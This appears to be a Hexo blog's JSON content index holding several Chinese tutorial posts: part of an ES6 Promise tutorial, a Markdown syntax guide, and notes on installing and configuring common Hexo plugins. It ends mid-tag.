的实例，但是p2的resolve方法将p1作为参数，即一个异步操作的结果是返回另一个异步操作。 注意，这时p1的状态就会传递给p2，也就是说，p1的状态决定了p2的状态。如果p1的状态是pending，那么p2的回调函数就会等待p1的状态改变；如果p1的状态已经是resolved或者rejected，那么p2的回调函数将会立刻执行。 123456789101112const p1 = new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error('fail')), 3000)&#125;)const p2 = new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; resolve(p1), 1000)&#125;)p2 .then(result =&gt; console.log(result)) .catch(error =&gt; console.log(error))// Error: fail 上面代码中，p1是一个 Promise，3 秒之后变为rejected。p2的状态在 1 秒之后改变，resolve方法返回的是p1。由于p2返回的是另一个 Promise，导致p2自己的状态无效了，由p1的状态决定p2的状态。所以，后面的then语句都变成针对后者（p1）。又过了 2 秒，p1变为rejected，导致触发catch方法指定的回调函数。 注意，调用resolve或reject并不会终结 Promise 的参数函数的执行。 12345678new Promise((resolve, reject) =&gt; &#123; resolve(1); console.log(2);&#125;).then(r =&gt; &#123; console.log(r);&#125;);// 2// 1 上面代码中，调用resolve(1)以后，后面的console.log(2)还是会执行，并且会首先打印出来。这是因为立即 resolved 的 Promise 是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务。 一般来说，调用resolve或reject以后，Promise 的使命就完成了，后继操作应该放到then方法里面，而不应该直接写在resolve或reject的后面。所以，最好在它们前面加上return语句，这样就不会有意外。 12345new Promise((resolve, reject) =&gt; &#123; return resolve(1); // 后面的语句不会执行 console.log(2);&#125;) Promise.prototype.then()Promise 实例具有then方法，也就是说，then方法是定义在原型对象Promise.prototype上的。它的作用是为 Promise 实例添加状态改变时的回调函数。前面说过，then方法的第一个参数是resolved状态的回调函数，第二个参数（可选）是rejected状态的回调函数。 then方法返回的是一个新的Promise实例（注意，不是原来那个Promise实例）。因此可以采用链式写法，即then方法后面再调用另一个then方法。 12345getJSON(\"/posts.json\").then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;); 上面的代码使用then方法，依次指定了两个回调函数。第一个回调函数完成以后，会将返回结果作为参数，传入第二个回调函数。 采用链式的then，可以指定一组按照次序调用的回调函数。这时，前一个回调函数，有可能返回的还是一个Promise对象（即有异步操作），这时后一个回调函数，就会等待该Promise对象的状态发生变化，才会被调用。 1234567getJSON(\"/post/1.json\").then(function(post) &#123; return getJSON(post.commentURL);&#125;).then(function funcA(comments) &#123; console.log(\"resolved: \", comments);&#125;, function funcB(err)&#123; console.log(\"rejected: \", err);&#125;); 上面代码中，第一个then方法指定的回调函数，返回的是另一个Promise对象。这时，第二个then方法指定的回调函数，就会等待这个新的Promise对象状态发生变化。如果变为resolved，就调用funcA，如果状态变为rejected，就调用funcB。 如果采用箭头函数，上面的代码可以写得更简洁。 123456getJSON(\"/post/1.json\").then( post =&gt; getJSON(post.commentURL)).then( comments =&gt; console.log(\"resolved: \", comments), err =&gt; console.log(\"rejected: \", err)); Promise.prototype.catch()Promise.prototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数。 123456getJSON('/posts.json').then(function(posts) &#123; // ...&#125;).catch(function(error) &#123; // 处理 getJSON 和 前一个回调函数运行时发生的错误 console.log('发生错误！', error);&#125;); 上面代码中，getJSON方法返回一个 Promise 对象，如果该对象状态变为resolved，则会调用then方法指定的回调函数；如果异步操作抛出错误，状态就会变为rejected，就会调用catch方法指定的回调函数，处理这个错误。另外，then方法指定的回调函数，如果运行中抛出错误，也会被catch方法捕获。 123456p.then((val) =&gt; console.log('fulfilled:', val)) .catch((err) =&gt; console.log('rejected', err));// 等同于p.then((val) =&gt; console.log('fulfilled:', val)) .then(null, (err) =&gt; console.log(\"rejected:\", err)); 下面是一个例子。 1234567const promise = new Promise(function(resolve, reject) &#123; throw new Error('test');&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);// Error: test 上面代码中，promise抛出一个错误，就被catch方法指定的回调函数捕获。注意，上面的写法与下面两种写法是等价的。 12345678910111213141516171819// 写法一const promise = new Promise(function(resolve, reject) &#123; try &#123; throw new Error('test'); &#125; catch(e) &#123; reject(e); &#125;&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);// 写法二const promise = new Promise(function(resolve, reject) &#123; reject(new Error('test'));&#125;);promise.catch(function(error) &#123; console.log(error);&#125;); 比较上面两种写法，可以发现reject方法的作用，等同于抛出错误。 如果 Promise 状态已经变成resolved，再抛出错误是无效的。 12345678const promise = new Promise(function(resolve, reject) &#123; resolve('ok'); throw new Error('test');&#125;);promise .then(function(value) &#123; console.log(value) &#125;) .catch(function(error) &#123; console.log(error) &#125;);// ok 上面代码中，Promise 在resolve语句后面，再抛出错误，不会被捕获，等于没有抛出。因为 Promise 的状态一旦改变，就永久保持该状态，不会再变了。 Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个catch语句捕获。 1234567getJSON('/post/1.json').then(function(post) &#123; return getJSON(post.commentURL);&#125;).then(function(comments) &#123; // some code&#125;).catch(function(error) &#123; // 处理前面三个Promise产生的错误&#125;); 上面代码中，一共有三个 Promise 对象：一个由getJSON产生，两个由then产生。它们之中任何一个抛出的错误，都会被最后一个catch捕获。 一般来说，不要在then方法里面定义 Reject 状态的回调函数（即then的第二个参数），总是使用catch方法。 12345678910111213141516// badpromise .then(function(data) &#123; // success &#125;, function(err) &#123; // error &#125;);// goodpromise .then(function(data) &#123; //cb // success &#125;) .catch(function(err) &#123; // error &#125;); 上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面then方法执行中的错误，也更接近同步的写法（try/catch）。因此，建议总是使用catch方法，而不使用then方法的第二个参数。 跟传统的try/catch代码块不同的是，如果没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。 1234567891011121314const someAsyncThing = function() &#123; return new Promise(function(resolve, reject) &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;);&#125;;someAsyncThing().then(function() &#123; console.log('everything is great');&#125;);setTimeout(() =&gt; &#123; console.log(123) &#125;, 2000);// Uncaught (in promise) ReferenceError: x is not defined// 123 上面代码中，someAsyncThing函数产生的 Promise 对象，内部有语法错误。浏览器运行到这一行，会打印出错误提示ReferenceError: x is not defined，但是不会退出进程、终止脚本执行，2 秒之后还是会输出123。这就是说，Promise 内部的错误不会影响到 Promise 外部的代码，通俗的说法就是“Promise 会吃掉错误”。 这个脚本放在服务器执行，退出码就是0（即表示执行成功）。不过，Node 有一个unhandledRejection事件，专门监听未捕获的reject错误，上面的脚本会触发这个事件的监听函数，可以在监听函数里面抛出错误。 123process.on('unhandledRejection', function (err, p) &#123; throw err;&#125;); 上面代码中，unhandledRejection事件的监听函数有两个参数，第一个是错误对象，第二个是报错的 Promise 实例，它可以用来了解发生错误的环境信息。 注意，Node 有计划在未来废除unhandledRejection事件。如果 Promise 内部有未捕获的错误，会直接终止进程，并且进程的退出码不为 0。 再看下面的例子。 1234567const promise = new Promise(function (resolve, reject) &#123; resolve('ok'); setTimeout(function () &#123; throw new Error('test') &#125;, 0)&#125;);promise.then(function (value) &#123; console.log(value) &#125;);// ok// Uncaught Error: test 上面代码中，Promise 指定在下一轮“事件循环”再抛出错误。到了那个时候，Promise 的运行已经结束了，所以这个错误是在 Promise 函数体外抛出的，会冒泡到最外层，成了未捕获的错误。 一般总是建议，Promise 对象后面要跟catch方法，这样可以处理 Promise 内部发生的错误。catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。 12345678910111213141516const someAsyncThing = function() &#123; return new Promise(function(resolve, reject) &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;);&#125;;someAsyncThing().catch(function(error) &#123; console.log('oh no', error);&#125;).then(function() &#123; console.log('carry on');&#125;);// oh no [ReferenceError: x is not defined]// carry on 上面代码运行完catch方法指定的回调函数，会接着运行后面那个then方法指定的回调函数。如果没有报错，则会跳过catch方法。 12345678Promise.resolve().catch(function(error) &#123; console.log('oh no', error);&#125;).then(function() &#123; console.log('carry on');&#125;);// carry on 上面的代码因为没有报错，跳过了catch方法，直接执行后面的then方法。此时，要是then方法里面报错，就与前面的catch无关了。 catch方法之中，还能再抛出错误。 1234567891011121314151617const someAsyncThing = function() &#123; return new Promise(function(resolve, reject) &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;);&#125;;someAsyncThing().then(function() &#123; return someOtherAsyncThing();&#125;).catch(function(error) &#123; console.log('oh no', error); // 下面一行会报错，因为 y 没有声明 y + 2;&#125;).then(function() &#123; console.log('carry on');&#125;);// oh no [ReferenceError: x is not defined] 上面代码中，catch方法抛出一个错误，因为后面没有别的catch方法了，导致这个错误不会被捕获，也不会传递到外层。如果改写一下，结果就不一样了。 1234567891011someAsyncThing().then(function() &#123; return someOtherAsyncThing();&#125;).catch(function(error) &#123; console.log('oh no', error); // 下面一行会报错，因为y没有声明 y + 2;&#125;).catch(function(error) &#123; console.log('carry on', error);&#125;);// oh no [ReferenceError: x is not defined]// carry on [ReferenceError: y is not defined] 上面代码中，第二个catch方法用来捕获，前一个catch方法抛出的错误。 Promise.prototype.finally()finally方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。该方法是 ES2018 引入标准的。 1234promise.then(result =&gt; &#123;···&#125;).catch(error =&gt; &#123;···&#125;).finally(() =&gt; &#123;···&#125;); 上面代码中，不管promise最后的状态，在执行完then或catch指定的回调函数以后，都会执行finally方法指定的回调函数。 下面是一个例子，服务器使用 Promise 处理请求，然后使用finally方法关掉服务器。 12345server.listen(port) .then(function () &#123; // ... &#125;) .finally(server.stop); finally方法的回调函数不接受任何参数，这意味着没有办法知道，前面的 Promise 状态到底是fulfilled还是rejected。这表明，finally方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。 finally本质上是then方法的特例。 1234567891011121314151617promise.finally(() =&gt; &#123; // 语句&#125;);// 等同于promise.then( result =&gt; &#123; // 语句 return result; &#125;, error =&gt; &#123; // 语句 throw error; &#125;); 上面代码中，如果不使用finally方法，同样的语句需要为成功和失败两种情况各写一次。有了finally方法，则只需要写一次。 它的实现也很简单。 1234567Promise.prototype.finally = function (callback) &#123; let P = this.constructor; return this.then( value =&gt; P.resolve(callback()).then(() =&gt; value), reason =&gt; P.resolve(callback()).then(() =&gt; &#123; throw reason &#125;) );&#125;; 上面代码中，不管前面的 Promise 是fulfilled还是rejected，都会执行回调函数callback。 从上面的实现还可以看到，finally方法总是会返回原来的值。 1234567891011// resolve 的值是 undefinedPromise.resolve(2).then(() =&gt; &#123;&#125;, () =&gt; &#123;&#125;)// resolve 的值是 2Promise.resolve(2).finally(() =&gt; &#123;&#125;)// reject 的值是 undefinedPromise.reject(3).then(() =&gt; &#123;&#125;, () =&gt; &#123;&#125;)// reject 的值是 3Promise.reject(3).finally(() =&gt; &#123;&#125;) Promise.all()Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。 1const p = Promise.all([p1, p2, p3]); 上面代码中，Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。） p的状态由p1、p2、p3决定，分成两种情况。 （1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。 （2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 下面是一个具体的例子。 12345678910// 生成一个Promise对象的数组const promises = [2, 3, 5, 7, 11, 13].map(function (id) &#123; return getJSON('/post/' + id + \".json\");&#125;);Promise.all(promises).then(function (posts) &#123; // ...&#125;).catch(function(reason)&#123; // ...&#125;); 上面代码中，promises是包含 6 个 Promise 实例的数组，只有这 6 个实例的状态都变成fulfilled，或者其中有一个变为rejected，才会调用Promise.all方法后面的回调函数。 下面是另一个例子。 12345678910111213const databasePromise = connectDatabase();const booksPromise = databasePromise .then(findAllBooks);const userPromise = databasePromise .then(getCurrentUser);Promise.all([ booksPromise, userPromise]).then(([books, user]) =&gt; pickTopRecommentations(books, user)); 上面代码中，booksPromise和userPromise是两个异步操作，只有等到它们的结果都返回了，才会触发pickTopRecommentations这个回调函数。 注意，如果作为参数的 Promise 实例，自己定义了catch方法，那么它一旦被rejected，并不会触发Promise.all()的catch方法。 12345678910111213141516const p1 = new Promise((resolve, reject) =&gt; &#123; resolve('hello');&#125;).then(result =&gt; result).catch(e =&gt; e);const p2 = new Promise((resolve, reject) =&gt; &#123; throw new Error('报错了');&#125;).then(result =&gt; result).catch(e =&gt; e);Promise.all([p1, p2]).then(result =&gt; console.log(result)).catch(e =&gt; console.log(e));// [\"hello\", Error: 报错了] 上面代码中，p1会resolved，p2首先会rejected，但是p2有自己的catch方法，该方法返回的是一个新的 Promise 实例，p2指向的实际上是这个实例。该实例执行完catch方法后，也会变成resolved，导致Promise.all()方法参数里面的两个实例都会resolved，因此会调用then方法指定的回调函数，而不会调用catch方法指定的回调函数。 如果p2没有自己的catch方法，就会调用Promise.all()的catch方法。 1234567891011121314const p1 = new Promise((resolve, reject) =&gt; &#123; resolve('hello');&#125;).then(result =&gt; result);const p2 = new Promise((resolve, reject) =&gt; &#123; throw new Error('报错了');&#125;).then(result =&gt; result);Promise.all([p1, p2]).then(result =&gt; console.log(result)).catch(e =&gt; console.log(e));// Error: 报错了 Promise.race()Promise.race方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。 1const p = Promise.race([p1, p2, p3]); 上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。 Promise.race方法的参数与Promise.all方法一样，如果不是 Promise 实例，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。 下面是一个例子，如果指定时间内没有获得结果，就将 Promise 的状态变为reject，否则变为resolve。 12345678const p = Promise.race([ fetch('/resource-that-may-take-a-while'), new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error('request timeout')), 5000) &#125;)]);p.then(response =&gt; console.log(response));p.catch(error =&gt; console.log(error)); 上面代码中，如果 5 秒之内fetch方法无法返回结果，变量p的状态就会变为rejected，从而触发catch方法指定的回调函数。 Promise.resolve()有时需要将现有对象转为 Promise 对象，Promise.resolve方法就起到这个作用。 1const jsPromise = Promise.resolve($.ajax('/whatever.json')); 上面代码将 jQuery 生成的deferred对象，转为一个新的 Promise 对象。 Promise.resolve等价于下面的写法。 123Promise.resolve('foo')// 等价于new Promise(resolve =&gt; resolve('foo')) Promise.resolve方法的参数分成四种情况。 （1）参数是一个 Promise 实例 如果参数是 Promise 实例，那么Promise.resolve将不做任何修改、原封不动地返回这个实例。 （2）参数是一个thenable对象 thenable对象指的是具有then方法的对象，比如下面这个对象。 12345let thenable = &#123; then: function(resolve, reject) &#123; resolve(42); &#125;&#125;; Promise.resolve方法会将这个对象转为 Promise 对象，然后就立即执行thenable对象的then方法。 12345678910let thenable = &#123; then: function(resolve, reject) &#123; resolve(42); &#125;&#125;;let p1 = Promise.resolve(thenable);p1.then(function(value) &#123; console.log(value); // 42&#125;); 上面代码中，thenable对象的then方法执行后，对象p1的状态就变为resolved，从而立即执行最后那个then方法指定的回调函数，输出 42。 （3）参数不是具有then方法的对象，或根本就不是对象 如果参数是一个原始值，或者是一个不具有then方法的对象，则Promise.resolve方法返回一个新的 Promise 对象，状态为resolved。 123456const p = Promise.resolve('Hello');p.then(function (s)&#123; console.log(s)&#125;);// Hello 上面代码生成一个新的 Promise 对象的实例p。由于字符串Hello不属于异步操作（判断方法是字符串对象不具有 then 方法），返回 Promise 实例的状态从一生成就是resolved，所以回调函数会立即执行。Promise.resolve方法的参数，会同时传给回调函数。 （4）不带有任何参数 Promise.resolve方法允许调用时不带参数，直接返回一个resolved状态的 Promise 对象。 所以，如果希望得到一个 Promise 对象，比较方便的方法就是直接调用Promise.resolve方法。 12345const p = Promise.resolve();p.then(function () &#123; // ...&#125;); 上面代码的变量p就是一个 Promise 对象。 需要注意的是，立即resolve的 Promise 对象，是在本轮“事件循环”（event loop）的结束时，而不是在下一轮“事件循环”的开始时。 12345678910111213setTimeout(function () &#123; console.log('three');&#125;, 0);Promise.resolve().then(function () &#123; console.log('two');&#125;);console.log('one');// one// two// three 上面代码中，setTimeout(fn, 0)在下一轮“事件循环”开始时执行，Promise.resolve()在本轮“事件循环”结束时执行，console.log(&#39;one&#39;)则是立即执行，因此最先输出。 Promise.reject()Promise.reject(reason)方法也会返回一个新的 Promise 实例，该实例的状态为rejected。 12345678const p = Promise.reject('出错了');// 等同于const p = new Promise((resolve, reject) =&gt; reject('出错了'))p.then(null, function (s) &#123; console.log(s)&#125;);// 出错了 上面代码生成一个 Promise 对象的实例p，状态为rejected，回调函数会立即执行。 注意，Promise.reject()方法的参数，会原封不动地作为reject的理由，变成后续方法的参数。这一点与Promise.resolve方法不一致。 1234567891011const thenable = &#123; then(resolve, reject) &#123; reject('出错了'); &#125;&#125;;Promise.reject(thenable).catch(e =&gt; &#123; console.log(e === thenable)&#125;)// true 上面代码中，Promise.reject方法的参数是一个thenable对象，执行以后，后面catch方法的参数不是reject抛出的“出错了”这个字符串，而是thenable对象。 应用加载图片我们可以将图片的加载写成一个Promise，一旦加载完成，Promise的状态就发生变化。 12345678const preloadImage = function (path) &#123; return new Promise(function (resolve, reject) &#123; const image = new Image(); image.onload = resolve; image.onerror = reject; image.src = path; &#125;);&#125;; Generator 函数与 Promise 的结合使用 Generator 函数管理流程，遇到异步操作的时候，通常返回一个Promise对象。 1234567891011121314151617181920212223242526272829303132function getFoo () &#123; return new Promise(function (resolve, reject)&#123; resolve('foo'); &#125;);&#125;const g = function* () &#123; try &#123; const foo = yield getFoo(); console.log(foo); &#125; catch (e) &#123; console.log(e); &#125;&#125;;function run (generator) &#123; const it = generator(); function go(result) &#123; if (result.done) return result.value; return result.value.then(function (value) &#123; return go(it.next(value)); &#125;, function (error) &#123; return go(it.throw(error)); &#125;); &#125; go(it.next());&#125;run(g); 上面代码的 Generator 函数g之中，有一个异步操作getFoo，它返回的就是一个Promise对象。函数run用来处理这个Promise对象，并调用下一个next方法。 Promise.try()实际开发中，经常遇到一种情况：不知道或者不想区分，函数f是同步函数还是异步操作，但是想用 Promise 来处理它。因为这样就可以不管f是否包含异步操作，都用then方法指定下一步流程，用catch方法处理f抛出的错误。一般就会采用下面的写法。 1Promise.resolve().then(f) 上面的写法有一个缺点，就是如果f是同步函数，那么它会在本轮事件循环的末尾执行。 12345const f = () =&gt; console.log('now');Promise.resolve().then(f);console.log('next');// next// now 上面代码中，函数f是同步的，但是用 Promise 包装了以后，就变成异步执行了。 那么有没有一种方法，让同步函数同步执行，异步函数异步执行，并且让它们具有统一的 API 呢？回答是可以的，并且还有两种写法。第一种写法是用async函数来写。 12345const f = () =&gt; console.log('now');(async () =&gt; f())();console.log('next');// now// next 上面代码中，第二行是一个立即执行的匿名函数，会立即执行里面的async函数，因此如果f是同步的，就会得到同步的结果；如果f是异步的，就可以用then指定下一步，就像下面的写法。 12(async () =&gt; f())().then(...) 需要注意的是，async () =&gt; f()会吃掉f()抛出的错误。所以，如果想捕获错误，要使用promise.catch方法。 123(async () =&gt; f())().then(...).catch(...) 第二种写法是使用new Promise()。 123456789const f = () =&gt; console.log('now');( () =&gt; new Promise( resolve =&gt; resolve(f()) ))();console.log('next');// now// next 上面代码也是使用立即执行的匿名函数，执行new Promise()。这种情况下，同步函数也是同步执行的。 鉴于这是一个很常见的需求，所以现在有一个提案，提供Promise.try方法替代上面的写法。 12345const f = () =&gt; console.log('now');Promise.try(f);console.log('next');// now// next 事实上，Promise.try存在已久，Promise 库Bluebird、Q和when，早就提供了这个方法。 由于Promise.try为所有操作提供了统一的处理机制，所以如果想用then方法管理流程，最好都用Promise.try包装一下。这样有许多好处，其中一点就是可以更好地管理异常。 123456function getUsername(userId) &#123; return database.users.get(&#123;id: userId&#125;) .then(function(user) &#123; return user.name; &#125;);&#125; 上面代码中，database.users.get()返回一个 Promise 对象，如果抛出异步错误，可以用catch方法捕获，就像下面这样写。 123database.users.get(&#123;id: userId&#125;).then(...).catch(...) 但是database.users.get()可能还会抛出同步错误（比如数据库连接错误，具体要看实现方法），这时你就不得不用try...catch去捕获。 1234567try &#123; database.users.get(&#123;id: userId&#125;) .then(...) .catch(...)&#125; catch (e) &#123; // ...&#125; 上面这样的写法就很笨拙了，这时就可以统一用promise.catch()捕获所有同步和异步的错误。 123Promise.try(database.users.get(&#123;id: userId&#125;)) .then(...) .catch(...) 事实上，Promise.try就是模拟try代码块，就像promise.catch模拟的是catch代码块。","categories":[{"name":"javascript","slug":"javascript","permalink":"https://jiuylq.github.io/categories/javascript/"}],"tags":[{"name":"ES6","slug":"ES6","permalink":"https://jiuylq.github.io/tags/ES6/"}]},{"title":"markdown-guide","slug":"markdown-guide","date":"2017-11-05T14:41:34.000Z","updated":"2017-11-05T16:38:01.118Z","comments":true,"path":"2017/11/05/markdown-guide/","link":"","permalink":"https://jiuylq.github.io/2017/11/05/markdown-guide/","excerpt":"Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。","text":"Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。 Markdown简介Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。这个教程可以让使用 Markdown 的新手快速熟悉语法和快捷键。本文基于 Ghost 的 Markdown 指南，兼容标准版 Markdown 编辑器和 Github Flavored Markdown。 NOTE: 虽然 Markdown 标记语言不能够实现 HTML 语法上的全部功能，但你可以混合使用 HTML 和 Markdown 语法。此页提供 Markdown 的简单入门指南，而 语法说明 页提供了详细的文档。 常用语法标题1234567891011# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题或这是一个一级标题============================这是一个二级标题-------------------------------------------------- 注：# 和「标题」之间建议保留一个字符的空格，这是最标准的 Markdown 写法。 列表 无序列表 无序列表是使用*,+,-中任意一种来表示1234567891011* 文本1* 文本2* 文本3或+ 文本1+ 文本2+ 文本3或- 文本1- 文本2- 文本3 有序列表 1231. 文本12. 文本23. 文本3 注：-、1.和文本之间要保留一个字符的空格。 链接和图片 链接 行内式在 Markdown 中，插入链接不需要其他按钮，你只需要使用 显示文本 这样的语法即可，例如： 12[title](url &quot;描述&quot;)[hexo](https://hexo.io) hexo 参考式1234[title][id] 标记: [id]: https://www.baidu.com/ &quot;度娘&quot; 或者: [id]: https://www.baidu.com/ &apos;度娘&apos; (简书不支持) 或者 [id]: https://www.baidu.com/ (度娘) [title][121][121]: https://www.baidu.com/ “度娘” 隐式链接标记功能12[Baidu][] 标记可以这样写: [Baidu]: http://baidu.com Baidu 参考式链接范例: 12345678910I get 10 times more traffic from [Google] [1] than from [Yahoo] [2] or [MSN] [3]. [1]: http://google.com/ &quot;Google&quot; [2]: http://search.yahoo.com/ &quot;Yahoo Search&quot; [3]: http://search.msn.com/ &quot;MSN Search&quot; I get 10 times more traffic from [Google][] than from [Yahoo][] or [MSN][]. [google]: http://google.com/ &quot;Google&quot; [yahoo]: http://search.yahoo.com/ &quot;Yahoo Search&quot; [msn]: http://search.msn.com/ &quot;MSN Search&quot; 自动链接12示例如下: &lt;http:\\\\www.baidu.com&gt; 图片 在 Markdown 中，插入图片不需要其他按钮，你只需要使用 这样的语法即可，例如： 123456![图片Alt](图片地址 “图片Title”)![title](https://hexo.io/img/a.jpg)![title](https://hexo.io/img/a.jpg &quot;描述&quot;)或![title][1][1]: https://hexo.io/img/a.jpg &quot;描述&quot; 注：插入图片的语法和链接的语法很像，只是前面多了一个 ！。 强调 Markdown使用性星号()和底线(_)作为标记强调字词的符号两端被一个或包围的单词会被转换成斜体两端被两个*或`包围的单词会被转换成粗体*`或_的两端不能有空白用什么符号就以什么符号结尾 1234567示例*斜体*_斜体_**粗体**__粗体__***加粗斜体***~~删除线~~ 斜体 _斜体_ 粗体 粗体 加粗斜体 删除线 引用 在我们写作的时候经常需要引用他人的文字，这个时候引用这个格式就很有必要了，在 Markdown 中，你只需要在你希望引用的文字前面加上 &gt; 就好了，例如： 1234567891011121314&gt; 简单引用1 &gt; 简单引用2 &gt; &gt; 多行引用 &gt;&gt; 嵌套引用 &gt; ## 引用中使用Markdown语法。 &gt; &gt; 1. 这是第一行列表项。 &gt; 2. 这是第二行列表项。 &gt; &gt; 给出一些例子代码： &gt; &gt; return shell_exec(&quot;echo $input | $markdown_script&quot;); 简单引用1简单引用2 多行引用 嵌套引用 引用中使用Markdown语法。 这是第一行列表项。 这是第二行列表项。 给出一些例子代码： return shell_exec(&quot;echo $input | $markdown_script&quot;); 代码引用 需要引用代码时，如果引用的语句只有一段，不分行，可以用`将语句包起来。如果引用的语句为多行，可以将```置于这段代码的首行和末行。 分隔线 一行中用三个以上的星号、减号、底线来建立一个分隔线,行内不能有其他东西,也可以在星号或是减号中间插入空格 1--- 1- - - 1*** 1* * * 1—————————————— —————————————— 段落和换行 段落 段落是由一个或多个连续的文本行组成,它的前后要一个以上的空行(显示上看起来像是空的) 换行 Mardown允许段落内的强迫换行(插入换行符)要依赖Markdown来插入&lt;br/&gt;标签的话,在&lt;br/&gt;插入处要先按入两个以上的空格然后回车 表格 居中 1234567891011 Tables | Are | Cool :------------: |:-------------:|:-----: col 3 is | right-aligned | $1600 col 2 is | centered | $12 zebra stripes | are neat | $1 或| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | $1600 || col 2 is | centered | $12 || zebra stripes | are neat | $1 | Tables Are Cool col 3 is right-aligned $1600 col 2 is centered $12 zebra stripes are neat $1 不居中 12345dog | bird | cat----|------|----foo | foo | foobar | bar | barbaz | baz | baz dog bird cat foo foo foo bar bar bar baz baz baz 123456789101112131415161718192021221、简单方式写表格：学号|姓名|分数-|-|-小明|男|75小红|女|79小陆|男|922、原生方式写表格：|学号|姓名|分数||-|-|-||小明|男|75||小红|女|79||小陆|男|92|3、为表格第二列指定方向：产品|价格-|-:Leanote 高级账号|60元/年Leanote 超级账号|120元/年 1、简单方式写表格： 学号 姓名 分数 小明 男 75 小红 女 79 小陆 男 92 2、原生方式写表格： 学号 姓名 分数 小明 男 75 小红 女 79 小陆 男 92 3、为表格第二列指定方向： 产品 价格 Leanote 高级账号 60元/年 Leanote 超级账号 120元/年 转义 使用反斜杠来插入一些在语法中有其它意义的符号,如*需要转义的字符: 123456789101112\\ 反斜线` 反引号* 星号_ 底线&#123;&#125; 花括号[] 方括号() 括弧# 井字号+ 加号- 减号. 英文句点! 惊叹号 锚点网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。注意： Markdown Extra 只支持在标题后插入锚点，其它地方无效。 Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。 12## 0. 目录&#123;#index&#125;跳转到[目录](#index) 注脚 在需要添加注脚的文字后加上脚注名字[^注脚名字],称为加注。 然后在文本的任意位置(一般在最后)添加脚注，脚注前必须有对应的脚注名字。 1234使用 Markdown[^1]可以效率的书写文档, 直接转换成 HTML[^2] ,你可以使用 Leanote[^Le] 编辑器进行书写。[^1]:Markdown是一种纯文本标记语言[^2]:HyperText Markup Language 超文本标记语言[^Le]:开源笔记平台，支持Markdown和笔记直接发为博文 使用 Markdown^1可以效率的书写文档, 直接转换成 HTML^2 ,你可以使用 Leanote^Le 编辑器进行书写。","categories":[{"name":"Markdown","slug":"Markdown","permalink":"https://jiuylq.github.io/categories/Markdown/"}],"tags":[{"name":"Markdown","slug":"Markdown","permalink":"https://jiuylq.github.io/tags/Markdown/"}]},{"title":"plugins-hexo","slug":"plugins-hexo","date":"2017-11-05T13:40:59.000Z","updated":"2019-04-07T04:18:53.917Z","comments":true,"path":"2017/11/05/plugins-hexo/","link":"","permalink":"https://jiuylq.github.io/2017/11/05/plugins-hexo/","excerpt":"Hexo博客常用插件及用法","text":"Hexo博客常用插件及用法 hexoDoc：https://hexo.io/zh-cn/Api：https://hexo.io/zh-cn/api/Plugins：https://hexo.io/plugins/Themes：https://hexo.io/themes/ hexo-generator-json-contentGithub：https://github.com/alexbruno/hexo-generator-json-content简介：用于生成静态站点数据，提供搜索功能的数据源。安装：1npm install hexo-generator-json-content --save 配置：在博客配置文件_config.yml中添加1234567jsonContent: ignore: - path/to/a/page - url/to/one/post - an-entire-category - specific.file - .ext # a file extension hexo-neatGithub：https://github.com/rozbo/hexo-neat简介：自动压缩html、css、js代码安装：1npm install hexo-neat --save 配置：在博客配置文件_config.yml中添加1neat_enable: true 压缩html代码123neat_html: enable: true exclude: 压缩CSS1234neat_css: enable: true exclude: - &apos;*.min.css&apos; 压缩JS1234567neat_js: enable: true mangle: true output: compress: exclude: - &apos;*.min.js&apos; hexo-wordcountGithub：https://github.com/willin/hexo-wordcountA Word Count Plugin for Hexo https://npmjs.org/package/hexo-wordcount简介：为文章添加文章字数统计、文章预计阅读时间安装：1npm install hexo-wordcount --save 使用：通过以上安装后，你可以在你的模板文件加入以下相关的标签实现本插件的功能字数统计:WordCount阅读时长预计:Min2Read总字数统计: TotalCount Ejs Post Count:1&lt;span 